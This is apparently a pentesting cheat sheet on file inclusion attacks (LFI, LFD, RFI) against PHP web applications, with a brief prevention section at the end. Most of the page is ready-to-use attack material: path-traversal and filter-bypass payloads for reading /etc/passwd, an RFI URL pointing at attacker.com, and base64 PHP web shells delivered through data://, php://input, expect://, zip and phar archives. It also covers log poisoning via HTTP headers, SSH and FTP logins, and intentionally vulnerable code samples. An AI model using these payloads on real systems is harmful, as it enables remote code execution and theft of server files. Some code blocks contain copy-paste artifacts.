---
description: Server-Side Attacks
---

# LFI && LFD && RFI



### Mechanism of Exploitation

LFI vulnerabilities commonly manifest in templating engines used across web applications. These engines facilitate uniformity in appearance by loading static elements like headers, navigation bars, and footers from shared templates. Dynamic content, specified via parameters in URLs such as **/**<mark style="color:red;">**index.php?page=abou**</mark><mark style="color:red;">t</mark> is then loaded separately without needing modification to every page for static changes. Exploiting this setup involves manipulating the parameter (`about` in this case) to retrieve and display unintended files, potentially exposing sensitive information.

*   Implications of LFI

    Exploiting LFI can result in severe consequences, including:

    * **Source Code Disclosure:** Attackers can access and study application source code, aiding in identifying and exploiting further vulnerabilities.
    * **Sensitive Data Exposure:** Critical data stored on the server, such as configuration files or credentials, may be exposed, facilitating deeper attacks.
    * **Remote Code Execution (RCE):** In specific scenarios, attackers may execute arbitrary code on the server, potentially compromising the entire infrastructure connected to it.

### Examples of Vulnerable Code

#### PHP

in PHP (**include()**, **include\_once().** **`require`()**, **`require`\_once(),**`file_get_contents()`)

```php

if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

#### Node.js

in js ⇒ **FS()**

```php
if (req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

```

Here, the `readFile` function uses `req.query.language` directly to construct the file path. If not properly validated, this can allow an attacker to read arbitrary files from the server. A similar risk exists in frameworks like Express.js when using functions such as `render()` to render specific files based on user-supplied parameters in the URL path.

#### .NET (C#)

In .NET applications, the `Response.WriteFile` function is commonly used to serve files dynamically. If the file path is derived from user input, it can lead to vulnerabilities. Below is an example in C# demonstrating this issue:

```csharp
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}

```

Here, if `language` is not properly validated, an attacker could control which file content gets written to the response. This could potentially expose sensitive data or allow for the execution of malicious code.

Exploit & Advanced Bypass Techniques for Local File Inclusion (LFI)

#### Non-Recursive Path Traversal Filters

if code have str\_replace('../', '', $\_GET\['language']);

```php

using ....//
<http://127.0.0.1/index.php?language=....//....//....//....//etc/passwd>

Or using ...././

<http://127.0.0.1/index.php?language=...././...././...././...././etc/passwd>

using Encodeing
<http://127.0.0.1/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64>
or usnig
....\\/....\\/....\\/etc/passwd 
<http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd>

```

#### Approved Paths

```php
if(preg_match('/^\\\\\\\\.\\\\\\\\/languages\\\\\\\\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Bypass

```php
<http://127.0.0.1/index.php?language=./languages/../../../../etc/passwd>

```

**Null Bytes**

Pre-5.5 PHP versions are vulnerable to null byte injections (`%00`). Adding `%00` truncates appended extensions (/`etc/passwd%00.php`) and includes only the path before the null byte `(**/etc/passwd**`).

PHP

This is **solved since PHP 5.4**

```php
<http://127.0.0.1/index.php?language=/etc/passwd%00>

<http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00>

<http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd>

```

### PHP Filters for Exploiting LFI

#### Leveraging PHP Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) serve as specialized PHP wrappers that allow input to be filtered according to specified criteria. For LFI attacks, the `php://filter/` wrapper is particularly useful

#### PHP Filter Types

#### **php://filter**

1. **String Filters:** Modify strings based on specified rules.
2. **Conversion Filters:** Convert data between different formats (`convert.*`), useful for altering how data is read from files.
3. **Compression Filters:** Compress or decompress data on the fly (`zlib.*`).
4. **Encryption Filters:** Encrypt or decrypt data (`mcrypt.*`, `mdecrypt.*`).

```php
#encodeing
php://filter/convert.base64-encode/resource=<filename.php> #php,json,py etc..

#Decoding
php://filter/convert.base64-decode/resource=<filename.php>

#php://f
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```

#### **From existent folder**

Maybe the back-end is checking the folder path:

Copy

```php
<http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd>
or using private

<http://example.com/index.php?page=private/../../../../etc/passwd> # depth of 3+1=4

<http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd>

```

#### **Path Truncation Technique**

* /`etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
* When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
* Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

```php
<http://example.com/index.php?page=a/../../../../../../../../../etc/passwd>......[ADD MORE]....
<http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD> MORE]/././.
<http://example.com/index.php?page=....//....//etc/passwd>
<http://example.com/index.php?page=..///////..////..//////etc/passwd>
<http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd>
Maintain the initial path: <http://example.com/index.php?page=/var/www/../../etc/passwd>
<http://example.com/index.php?page=PhP://filter>
```

**Remote File Inclusion**

usnig HTTP:// or HTTPS:// Filter

```php
<http://example.com/index.php?page=http://atacker.com/mal.php>
<http://example.com/index.php?page=\\\\attacker.com\\shared\\mal.php>
```

or

Using PHP://

```php
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt

<?php system($_GET['cmd']);echo 'Shell done !'; ?>
```

### **Top 25 parameters**

```php
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

#### **Exploiting LFI for RCE**

#### **Data Wrapper (data://)**

The data:// wrapper allows inclusion of data directly into PHP scripts, making it ideal for injecting PHP code snippets and executing them on the server.

RCE via data://

PHP

```php
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
```

In this example:

We encode our PHP payload **`(<?php system($_GET["cmd"]); ?>) in Base64.`**

We pass it using data:// and specify text/plain;base64 as the content type.

#### **Input Wrapper (input://)**

The input:// wrapper allows PHP to read data from the standard input, typically used in POST requests. This wrapper is useful when the vulnerable parameter accepts POST data.

RCE via input:/

Shell

```php
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Here:

We send a POST request with our PHP payload using php://input.

The vulnerable script interprets this input and executes the command specified in cmd.

#### **Expect Wrapper (expect://)**

The expect:// wrapper is used to execute external commands directly through URL streams. It requires the expect PHP extension to be installed and enabled on the server.

RCE via expect://

Shell

```php
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

In this scenario:

We directly execute the id command using the expect:// wrapper.

The result is returned as the output of the HTTP request.

#### **Exploiting LFI and Web File Upload Attacks**

Local File Inclusion (LFI) vulnerabilities can be leveraged to achieve Remote Code Execution (RCE) when combined with web file upload functionalities. Let's explore how we can craft malicious uploads and use them to exploit LFI vulnerabilities effectively.

#### **Image Upload Exploitation**

Web applications often allow users to upload images. Exploiting an LFI vulnerability in such a scenario involves uploading a malicious file (e.g., shell.gif containing PHP code) and then including it via the vulnerable file inclusion mechanism.

#### **Crafting a Malicious Image**

**Create the Malicious Image (shell.gif)**:

Shell

```php
echo '**GIF8**<?php system($_GET["cmd"]); ?>' > shell.gif
```

Here, GIF8 represents the GIF file header, ensuring the file starts with valid image magic bytes.

**Upload the Image**: After uploading shell.gif to the server via the application's upload functionality, assuming the upload directory is accessible (e.g., /profile\_images/), we can include it in our LFI exploit.

#### **Exploiting LFI with Uploaded Image**

Assuming the path to the uploaded image is /profile\_images/shell.gif:

Shell

```php
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Replace \<SERVER\_IP> and \<PORT> with the appropriate values for your target.

#### **Zip Upload Exploitation**

Some applications may allow uploading zip archives, which can be abused using the zip:// wrapper to execute PHP code stored within the zip file.

#### **Creating and Exploiting a Zip Archive**

**Create a PHP Web Shell (shell.php)**:

Shell

```php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Zip the PHP File**:

Shell

```php
zip shell.jpg shell.php
```

This creates a zip archive named shell.jpg containing shell.php.

**Exploit LFI with Zip Archive**: Assuming the path to the uploaded zip archive is /profile\_images/shell.jpg:

Shell

```php
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### **Phar Upload Exploitation**

Using the phar:// wrapper, we can similarly exploit LFI vulnerabilities by crafting a phar archive that contains PHP code.

#### **Creating and Exploiting a Phar Archive**

**Create a PHP Script to Create Phar (shell.php)**:

PHP

```php
**<?php**
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

**Compile PHP Script into Phar Archive**:

Shell

```php
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

This compiles shell.php into shell.phar and renames it to shell.jpg.

**Exploit LFI with Phar Archive**: Assuming the path to the uploaded phar archive is /profile\_images/shell.jpg:

Shell

```php
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Poisoning

### Log File poisoning

This is a technique where an attacker injects malicious code into log files on the server, including via the LFI vulnerability. Since log files often record user input \
(such as <mark style="color:red;">**User-Agent**</mark> strings or <mark style="color:red;">**GET/POST parameters**</mark>, <mark style="color:red;">SSH login</mark>/ <mark style="color:red;">**FTP Login**</mark>, <mark style="color:red;">Apache</mark> <mark style="color:red;"></mark><mark style="color:red;">**Log**</mark>), an attacker can manipulate these inputs to inject PHP code.

Steps:Inject malicious code (usually PHP) into a log file

```php
GET /index.php?page=../../../../var/log/apache2/access.log HTTP/1.1
Host: vulnerable-website.com
User-Agent: <?php system($_GET['cmd']); ?>
```

Once  the log file eis poisoned&#x20;

{% code overflow="wrap" %}
```
http://vulnerable-website.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```
{% endcode %}

**Files Commonly Targeted for Log Poisoning:**

* Web server access/error logs (`/var/log/apache2/access.log`, `/var/log/httpd/access.log`).
* Mail logs (`/var/log/mail.log`).
* User logins (`/var/log/auth.log`).

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

### SSH Login Log Poisoning

**Step 1:** Connect to the server via SSH and input malicious PHP code as the username or password. For example:

```bash
ssh  '<?php system($_GET["cmd"]); ?>'@target.com
```



go to the auth.log file or secure

{% code overflow="wrap" %}
```bash
http://vulnerable-website.com/index.php?page=../../../../var/log/auth.log&cmd=id
```
{% endcode %}

### **LFI via FTP Login Log Poisoning**

step1; connect to the FTP

```bash
ftp target.com
Name: <?php system($_GET["cmd"]); ?>
```

The login will fail, but the attempt is logged in the FTP log files (e.g., `/var/log/vsftpd.log` or `/var/log/xferlog`).

**Step 2:** Use the LFI vulnerability to include the FTP log file:

{% code overflow="wrap" %}
```bash
bashCopy codehttp://vulnerable-website.com/index.php?page=../../../../var/log/vsftpd.log&cmd=id
```
{% endcode %}

## Inject Commands  (Metadata)

we will cover adding commands to the metadata by manipulating HTTP Headers like

(<mark style="color:red;">**User-Agent, Referer. X-Forwarded-For**</mark>)

using  Curl to manipulate the User-Agent

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
```

**-A => User-Agent**

**-e => Referer**

**-H => X-Forwarded-for**

1.  **User-Agent Header Injection:**

    {% code overflow="wrap" %}
    ```bash
    curl -A '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
    ```
    {% endcode %}
2.  **Referer Header Injection:**

    ```bash
    curl -e '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
    ```
3.  **X-Forwarded-For Header Injection:**

    ```bash
    curl -H "X-Forwarded-For: <?php system($_GET['cmd']); ?>" http://vulnerable-website.com/
    ```

Executing Commands via LFI

```bash
index.php?page=../../../../var/log/apache2/access.log&cmd=ls
```

## Exploit Steps for LFI via `/proc/self/environ`

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://vulnerable-website.com/
```

* **`-A`** sets the `User-Agent` header.
* The malicious payload `<?php system($_GET["cmd"]); ?>` is now part of the environment variable associated with `User-Agent`.

**2. Using LFI to Include `/proc/self/environ`**

Once the PHP code is injected into the environment, you can use the LFI vulnerability to include the `/proc/self/environ` file.

```bash
index.php?page=../../../../proc/self/environ&cmd=id
```

#### Data Wrapper (`data://`)

The `data://` wrapper allows inclusion of data directly into PHP scripts, making it ideal for injecting PHP code snippets and executing them on the server.

RCE via `data://`

{% code overflow="wrap" %}
```php
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
```
{% endcode %}

In this example:

* We encode our PHP payload (**`<?php system($_GET["cmd"]); ?>`**) in Base64.
* We pass it using `data://` and specify `text/plain;base64` as the content type.

Mitigation

**Disable Dangerous Wrappers**: Disable the **`data`**`://` wrapper by ensuring **`allow_url_include=Off`** in `php.ini`

## Preventing and Mitigating File Inclusion Vulnerabilities

## Preventing

1. input validation
2. Avoid Using User-Controllablelike (<mark style="color:red;">**include**</mark>, <mark style="color:red;">**require**</mark>, <mark style="color:red;">**file\_get\_contents**</mark>)
3. file Permission
4. config Hardening disable (<mark style="color:red;">**allow\_url\_fopen**</mark>, <mark style="color:red;">**alow\_url\_include**</mark>)

#### Mitigation Techniques:

1. **Contextual Validation:**
   * Implement context-specific validation of user inputs. For example, validate that URLs used for file inclusion are from trusted domains and not manipulated to include unintended files.
2. **Server-Side Security Controls:**
   * Utilize web application firewalls (WAFs) and intrusion detection systems (IDS) to monitor and block requests that attempt to exploit file inclusion vulnerabilities.
3. **File Path Handling:**
   * **LFI:** Use relative file paths instead of absolute paths whenever possible. This reduces the risk of an attacker specifying arbitrary files on the server.
   * **RFI:** Avoid dynamically constructing URLs for file inclusion. If necessary, validate and sanitize URLs rigorously to prevent unauthorized access.
4. **Logging and Monitoring:**
   * Implement logging mechanisms to record access attempts and exceptions related to file operations. Monitor logs for suspicious activities or attempts to access restricted files.
5. **Regular Security Audits:**
   * Conduct regular security audits and code reviews to identify and mitigate file inclusion vulnerabilities. Use automated tools and manual testing to detect and address vulnerabilities proactively.
